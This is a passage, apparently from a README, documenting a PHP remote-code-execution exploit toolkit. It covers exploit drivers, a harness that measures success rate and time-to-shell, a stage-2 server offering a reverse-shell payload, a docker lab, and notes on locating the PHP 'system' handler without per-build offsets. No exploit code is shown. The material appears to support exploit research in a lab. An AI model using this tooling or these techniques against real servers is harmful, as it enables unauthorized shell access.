    not fire / normal-size cookie / partial reclaim / chunk vote inconclusive).
    Fire loop catches `IndexError`/`network`/`other` exception classes and reports
    top-3 counts; >80% error rate triggers "payload/network broken, not reclaim-
    timing" diagnostic.
  - **KA transport hardening.** IPv6 Host headers properly bracketed
    (`[::1]:8080`), default ports omitted from Host (HTTP:80 / HTTPS:443),
    SNI skipped for IP-literal targets (some stacks reject invalid SNI).
    Helper fns `_is_ip_literal()`, `_host_header()` with unit tests.

- `php2shell_ka.py` — earlier driver (imports alvarodh5's exploit.py). Has keep-alive
  transport, chunked-TE, `--stage2`, `--htdata`. Being superseded by php2shell.py.
- `reliability.py` — reliability test harness: runs the exploit under configurable
  background load patterns (GET/mixed/upload/burst), measures success rate and time-to-shell
  with fresh lab restarts between configs. Produced the results tables above.
- `serve_stage2.py` — hosts the stage-2 payload (`--revshell HOST:PORT` or `--payload FILE`),
  logs each target fetch live as callback confirmation.
- `lab/` — stock docker-compose + Apache/PHP conf, multi-worker and calibration variants.

## Parked: fully offset-free resolution (improvement "A")

`spike_a2.pl` proved a data path to `zif_system` exists with no per-build offset
(`compiler_globals` is a dynsym export → `function_table` → `"system"` → `handler`).
But it requires an **arbitrary read**, and this bug's leak is only a *relative window*
dump (zend_string stores data inline), not a pointer-following read. No public PoC has
an arbitrary read here, which is why they all keep offset DBs. Parked unless a read
primitive turns up.
